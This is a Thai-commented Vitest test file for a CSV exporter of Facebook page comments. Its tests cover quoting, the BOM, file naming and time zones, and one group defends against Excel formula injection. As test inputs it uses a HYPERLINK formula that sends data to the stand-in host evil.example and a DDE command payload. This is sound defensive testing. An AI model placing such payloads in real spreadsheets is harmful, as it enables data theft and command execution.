import { describe, expect, it } from "vitest";
import {
  UTF8_BOM,
  commentsToCsv,
  csvCell,
  exportFileName,
  toCsv,
  type ExportableComment,
} from "./export.js";

describe("แปลงค่าหนึ่งช่องเป็น CSV", () => {
  it("ครอบด้วยเครื่องหมายคำพูดเสมอ ไม่ใช่เฉพาะตอนจำเป็น", () => {
    expect(csvCell("ปกติ")).toBe('"ปกติ"');
    expect(csvCell(42)).toBe('"42"');
  });

  /** ทั้งสามอย่างนี้อยู่ในคอมเมนต์จริงเป็นปกติ ไม่ escape แล้วตารางเพี้ยนทั้งไฟล์ */
  it("จุลภาคในข้อความไม่ทำให้คอลัมน์เพี้ยน", () => {
    expect(csvCell("อร่อย, ถูก, ส่งไว")).toBe('"อร่อย, ถูก, ส่งไว"');
  });

  it("เครื่องหมายคำพูดถูกแปลงเป็นสองตัวตาม RFC 4180", () => {
    expect(csvCell('เขาบอกว่า "ดีมาก"')).toBe('"เขาบอกว่า ""ดีมาก"""');
  });

  it("ขึ้นบรรทัดใหม่ในข้อความอยู่ในช่องเดิมได้", () => {
    expect(csvCell("บรรทัดแรก\nบรรทัดสอง")).toBe('"บรรทัดแรก\nบรรทัดสอง"');
  });

  it("ค่าว่าง / null / undefined → ช่องว่าง ไม่ใช่คำว่า null", () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell("")).toBe('""');
  });
});

/**
 * คอมเมนต์ในเพจ Facebook ใครก็พิมพ์ได้ ถ้าเขียนลงไฟล์ตรงๆ คนที่พิมพ์
 * `=HYPERLINK("http://evil.example?d="&A1,"คลิกรับส่วนลด")` จะได้ลิงก์ที่
 * ดูดข้อมูลจากไฟล์ส่งออกไปข้างนอก ทันทีที่คนดูแลเพจเปิดไฟล์ใน Excel
 *
 * ครอบด้วย `"` ไม่ช่วย — RFC บอกว่าเป็นข้อความ แต่ Excel คำนวณให้อยู่ดี
 */
describe("กัน Excel รันสูตรจากคอมเมนต์ของคนแปลกหน้า", () => {
  it.each([
    '=HYPERLINK("http://evil.example","คลิก")',
    "=1+1",
    "+66812345678",
    "-50% วันนี้",
    "@ร้านนี้",
    "=cmd|'/c calc'!A0",
  ])("%s ถูกทำให้เป็นข้อความธรรมดา", (text) => {
    expect(csvCell(text).startsWith(`"'`)).toBe(true);
  });

  /**
   * บางเวอร์ชันของ Excel ตัดช่องว่างนำหน้าทิ้งก่อนแล้วค่อยดูตัวถัดไป
   * `"\t=1+1"` จึงกลายเป็นสูตรได้ทั้งที่ตัวแรกไม่ใช่ `=`
   */
  it("แท็บหรือ CR นำหน้าก็ยังนับว่าเป็นสูตร", () => {
    expect(csvCell("\t=1+1").startsWith(`"'`)).toBe(true);
    expect(csvCell("\r=1+1").startsWith(`"'`)).toBe(true);
  });

  it("ข้อความยังอยู่ครบ ไม่ได้ตัดทิ้ง", () => {
    expect(csvCell("=1+1")).toBe(`"'=1+1"`);
  });

  it("ข้อความปกติไม่ถูกเติมอะไรเข้าไป", () => {
    expect(csvCell("อร่อยมากค่ะ")).toBe('"อร่อยมากค่ะ"');
    expect(csvCell("ราคา 50 บาท")).toBe('"ราคา 50 บาท"');
  });

  /**
   * ตัวเลขที่ส่งมาเป็น `number` คือค่าที่เราคำนวณเอง ไม่ใช่ข้อความของคนอื่น
   * ปล่อยผ่านเพื่อให้ค่าติดลบยังเป็นตัวเลขใน Excel ไม่กลายเป็นข้อความ
   */
  it("ตัวเลขติดลบยังเป็นตัวเลข ไม่โดนเติม '", () => {
    expect(csvCell(-50)).toBe('"-50"');
  });
});

describe("สร้างไฟล์ CSV", () => {
  /**
   * Excel บน Windows เดา encoding จากไบต์แรก ถ้าไม่มี BOM ภาษาไทยจะกลายเป็น
   * "à¸ªà¸´à¸™à¸„à¹‰à¸²" ทั้งไฟล์ แล้วคนเปิดจะคิดว่าโปรแกรมเราพัง
   */
  it("มี BOM นำหน้าเสมอ เพื่อให้ Excel อ่านภาษาไทยออก", () => {
    const csv = toCsv({ headers: ["ชื่อ"], rows: [["สินค้า"]] });
    expect(csv.startsWith(UTF8_BOM)).toBe(true);
    expect(csv).toContain("สินค้า");
  });

  it("ปิด BOM ได้ตอนอยากเทียบข้อความตรงๆ", () => {
    expect(toCsv({ headers: ["a"], rows: [], bom: false })).toBe('"a"');
  });

  it("ใช้ CRLF ตาม RFC 4180", () => {
    const csv = toCsv({ headers: ["a", "b"], rows: [["1", "2"]], bom: false });
    expect(csv).toBe('"a","b"\r\n"1","2"');
  });

  it("ไม่มีแถวเลย → ยังมีหัวตาราง", () => {
    expect(toCsv({ headers: ["a", "b"], rows: [], bom: false })).toBe('"a","b"');
  });

  it("จำนวนคอลัมน์ทุกแถวเท่ากับหัวตาราง", () => {
    const csv = toCsv({
      headers: ["a", "b", "c"],
      rows: [
        ["1", "2", "3"],
        ["4", null, "6"],
      ],
      bom: false,
    });
    for (const line of csv.split("\r\n")) {
      expect(line.split('","')).toHaveLength(3);
    }
  });
});

describe("ตั้งชื่อไฟล์", () => {
  const AT = Date.UTC(2026, 7, 14, 5);

  it("ขึ้นต้นด้วยวันที่ เพื่อให้เรียงตามชื่อแล้วได้เรียงตามเวลา", () => {
    expect(exportFileName({ prefix: "คอมเมนต์", atMs: AT })).toBe("คอมเมนต์-2026-08-14.csv");
  });

  it("ใส่คำค้นลงในชื่อไฟล์ด้วย จะได้รู้ว่าไฟล์ไหนคือผลค้นอะไร", () => {
    expect(exportFileName({ prefix: "คอมเมนต์", atMs: AT, keyword: "ส่งช้า" })).toBe(
      "คอมเมนต์-ส่งช้า-2026-08-14.csv",
    );
  });

  /** ชื่อไฟล์เป็นไทยใช้ได้ปกติ แต่อักขระพวกนี้ตั้งชื่อไฟล์บน Windows ไม่ได้ */
  it("ตัดอักขระที่ตั้งชื่อไฟล์ไม่ได้ทิ้ง แต่เก็บภาษาไทยไว้", () => {
    const name = exportFileName({ prefix: "c", atMs: AT, keyword: 'ราคา/ถูก:มาก?"<>|' });
    expect(name).toBe("c-ราคาถูกมาก-2026-08-14.csv");
  });

  it("แทนช่องว่างด้วยขีด", () => {
    expect(exportFileName({ prefix: "c", atMs: AT, keyword: "ส่ง ช้า มาก" })).toBe(
      "c-ส่ง-ช้า-มาก-2026-08-14.csv",
    );
  });

  it("คำค้นยาวมากถูกตัด ไม่ให้ชื่อไฟล์ยาวเกิน", () => {
    const name = exportFileName({ prefix: "c", atMs: AT, keyword: "ก".repeat(200) });
    expect(name.length).toBeLessThan(80);
  });

  it("คำค้นว่างหรือมีแต่ช่องว่าง → ไม่มีส่วนคำค้นในชื่อ", () => {
    expect(exportFileName({ prefix: "c", atMs: AT, keyword: "   " })).toBe("c-2026-08-14.csv");
  });
});

describe("CSV ของคอมเมนต์", () => {
  const comment = (over: Partial<ExportableComment> = {}): ExportableComment => ({
    createdAtMs: Date.UTC(2026, 7, 14, 5, 30),
    pageName: "ครัวคุณยาย",
    authorName: "สุณี ปะสาวะถา",
    message: "อร่อยมากค่ะ",
    postPermalink: "https://facebook.com/p/1",
    ...over,
  });

  it("มีหัวตารางภาษาไทยครบทุกคอลัมน์", () => {
    const csv = commentsToCsv({ comments: [], timeZone: "Asia/Bangkok" });
    expect(csv).toContain("เวลา");
    expect(csv).toContain("เพจ");
    expect(csv).toContain("คนคอมเมนต์");
    expect(csv).toContain("ข้อความ");
    expect(csv).toContain("ลิงก์โพสต์");
  });

  /** เวลาใน DB เป็น UTC เสมอ (กฎข้อ 4) — แปลงตอนแสดงผลเท่านั้น */
  it("แปลงเวลาเป็น timezone ที่ขอ ไม่ใช่ UTC ดิบ", () => {
    const csv = commentsToCsv({ comments: [comment()], timeZone: "Asia/Bangkok" });
    // 05:30 UTC = 12:30 เวลาไทย
    expect(csv).toContain("2026-08-14 12:30");
  });

  it("คนที่ไม่รู้ชื่อ → ช่องว่าง ไม่ใช่คำว่า null", () => {
    const csv = commentsToCsv({
      comments: [comment({ authorName: null, message: null, postPermalink: null })],
      timeZone: "UTC",
    });
    expect(csv).not.toContain("null");
  });

  it("คอมเมนต์ที่มีจุลภาคและขึ้นบรรทัดใหม่ ไม่ทำให้ไฟล์เพี้ยน", () => {
    const csv = commentsToCsv({
      comments: [comment({ message: 'อร่อย, ถูก\nแต่ "ส่งช้า"' })],
      timeZone: "UTC",
    });
    expect(csv).toContain('"อร่อย, ถูก\nแต่ ""ส่งช้า"""');
  });

  it("คอมเมนต์ที่แฝงสูตรมาก็ยังกันได้ตอนออกเป็นไฟล์จริง", () => {
    const csv = commentsToCsv({
      comments: [comment({ message: '=HYPERLINK("http://evil.example","คลิก")' })],
      timeZone: "UTC",
    });
    expect(csv).toContain(`"'=HYPERLINK(`);
    expect(csv).not.toContain(`"=HYPERLINK(`);
  });

  /**
   * หน้าดาวน์โหลดยอมให้ได้สูงสุด 50,000 แถว และมันทำงานอยู่ใน request handler
   * ของ Next.js — ถ้าช้าคือค้างทั้งหน้า
   *
   * เคยช้า 4 วินาทีเพราะสร้าง `Intl.DateTimeFormat` ใหม่ทุกแถว ซึ่งเป็นบั๊ก
   * ที่เทสต์ความถูกต้องมองไม่เห็นเลย (ผลลัพธ์ถูกทุกตัวอักษร แค่ช้า)
   * เกณฑ์ตั้งไว้หลวมๆ ที่ 2 วินาที เพื่อไม่ให้พังบนเครื่อง CI ที่ช้ากว่าปกติ
   * แต่ยังจับได้ถ้ามีใครเผลอย้ายมันกลับเข้าไปในลูป
   */
  it("50,000 แถวต้องไม่ค้างนานจนหน้าเว็บหมดเวลา", () => {
    const many = Array.from({ length: 50_000 }, (_, i) =>
      comment({ createdAtMs: Date.UTC(2026, 7, 14, 5, 30, i % 60) }),
    );
    const started = performance.now();
    const csv = commentsToCsv({ comments: many, timeZone: "Asia/Bangkok" });
    expect(performance.now() - started).toBeLessThan(2000);
    expect(csv.split("\r\n")).toHaveLength(50_001);
  });
});
